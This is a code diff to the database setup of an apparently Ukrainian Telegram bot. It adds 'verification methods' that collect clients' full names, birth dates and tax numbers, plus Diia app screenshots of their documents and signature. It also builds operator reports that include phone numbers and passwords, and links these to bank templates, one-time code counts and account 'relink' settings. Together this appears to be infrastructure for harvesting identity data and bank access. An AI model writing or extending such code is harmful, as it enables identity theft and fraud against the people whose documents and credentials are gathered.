@@ -2,7 +2,10 @@ import aiosqlite
 import contextvars
 import asyncio
 import logging
+import json
 from bot.config import DB_FILE, DEFAULT_BANK_ORDER, normalize_bank_name
+
+logger = logging.getLogger(__name__)
 
 from bot.services.chat_log_service import (
     current_sender,
@@ -140,7 +143,10 @@ async def init_db():
             ("is_verified", "INTEGER DEFAULT 0"),
             ("waiting_proceedings", "INTEGER DEFAULT 0"),
             ("proceedings_question_msg_id", "INTEGER"),
-            ("notified_banks", "TEXT DEFAULT ''")
+            ("notified_banks", "TEXT DEFAULT ''"),
+            ("method_key", "TEXT"),
+            ("start_param", "TEXT"),
+            ("is_relink", "INTEGER DEFAULT 0")
         ]
         
         for col_name, col_type in new_columns:
@@ -195,6 +201,32 @@ async def init_db():
                 deletion_text TEXT
             )
         """)
+
+        # Таблиця для методів верифікації (сценаріїв збору даних)
+        await db.execute("""
+            CREATE TABLE IF NOT EXISTS verification_methods (
+                key TEXT PRIMARY KEY,
+                display_name TEXT NOT NULL,
+                required_client_fields TEXT DEFAULT '[]',
+                required_screenshots INTEGER DEFAULT 0,
+                screenshot_instructions TEXT,
+                initial_message TEXT,
+                report_template TEXT,
+                ai_rules TEXT,
+                allowed_banks TEXT DEFAULT '[]',
+                ask_relink_at_start INTEGER DEFAULT 0,
+                is_active INTEGER DEFAULT 1,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        try:
+            await db.execute("ALTER TABLE verification_methods ADD COLUMN allowed_banks TEXT DEFAULT '[]'")
+        except Exception:
+            pass
+        try:
+            await db.execute("ALTER TABLE verification_methods ADD COLUMN ask_relink_at_start INTEGER DEFAULT 0")
+        except Exception:
+            pass
         for col, col_def in [
             ("code_length", "INTEGER DEFAULT 4"),
             ("logo_path", "TEXT"),
@@ -393,6 +425,61 @@ async def init_db():
                     "INSERT OR IGNORE INTO bank_templates (key, command, text, code_length) VALUES (?, ?, ?, ?)",
                     (key, val['command'], val['text'], val.get('code_length', 4))
                 )
+                await db.execute(
+                    """UPDATE bank_templates SET
+                        command = ?,
+                        text = ?,
+                        code_length = ?,
+                        allow_relink = COALESCE(?, allow_relink),
+                        relink_instruction_text = COALESCE(?, relink_instruction_text)
+                    WHERE key = ?""",
+                    (val['command'], val['text'], val.get('code_length', 4), val.get('allow_relink'), val.get('relink_instruction_text'), key)
+                )
+
+        # Заповнюємо базові методи верифікації
+        async with db.execute("SELECT COUNT(*) FROM verification_methods") as cursor:
+            count_row = await cursor.fetchone()
+            if count_row and count_row[0] == 0:
+                default_methods = [
+                    (
+                        "volk",
+                        "Волк (ПІБ / Дата / ІПН)",
+                        json.dumps(["pib", "dob", "ipn"]),
+                        1,
+                        "Після реєстрації надішліть, будь ласка, скріншот успішної верифікації.",
+                        "Напишіть мені будь ласка Ваші ПІБ та Дату Народження",
+                        "ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}\nТелефон: {phone}\n\n{line}\n\n{password}",
+                        None,
+                        json.dumps([]),
+                        0,
+                        1
+                    ),
+                    (
+                        "diia_screens",
+                        "3 скріни з Дії",
+                        json.dumps([]),
+                        3,
+                        "Надішліть, будь ласка, 3 скріншоти: 1) головний екран Дії, 2) документи, 3) підпис.",
+                        "Надішліть, будь ласка, 3 скріншоти з додатку Дія.",
+                        "Скріншоти верифікації з Дії.\nТелефон: {phone}",
+                        None,
+                        json.dumps(["pumb"]),
+                        1,
+                        1
+                    )
+                ]
+                await db.executemany(
+                    "INSERT INTO verification_methods (key, display_name, required_client_fields, required_screenshots, screenshot_instructions, initial_message, report_template, ai_rules, allowed_banks, ask_relink_at_start, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                    default_methods
+                )
+
+        # Міграція: встановлюємо allowed_banks та ask_relink_at_start для базових методів
+        try:
+            await db.execute("UPDATE verification_methods SET allowed_banks = ? WHERE key = 'diia_screens' AND (allowed_banks IS NULL OR allowed_banks = '[]')", (json.dumps(["pumb"]),))
+            await db.execute("UPDATE verification_methods SET allowed_banks = ? WHERE key = 'volk' AND (allowed_banks IS NULL OR allowed_banks = '')", (json.dumps([]),))
+            await db.execute("UPDATE verification_methods SET ask_relink_at_start = 1 WHERE key = 'diia_screens' AND (ask_relink_at_start IS NULL OR ask_relink_at_start = 0)")
+        except Exception as e:
+            logger.warning(f"Migration verification_methods failed: {e}")
 
         await db.commit()
 
@@ -418,6 +505,7 @@ from bot.services.sessions_service import (
     increment_session_sent_codes_count,
     create_registering_session,
     create_or_update_session,
+    update_session_is_relink,
     update_session_verification_data,
     get_session,
     update_session_verifier_message_id,
@@ -462,6 +550,17 @@ from bot.services.bank_templates_service import (
     get_bank_template_db,
     get_bank_template_with_key_db,
     get_bank_display_name,
+)
+
+# --- Методи верифікації (Verification Methods) ---
+
+from bot.services.verification_methods_service import (
+    get_all_verification_methods,
+    get_active_verification_methods,
+    get_verification_method,
+    save_verification_method,
+    delete_verification_method,
+    get_method_required_fields,
 )
 
 # --- Керування правилами та прикладами ШІ (AI Rules & Examples Management) ---
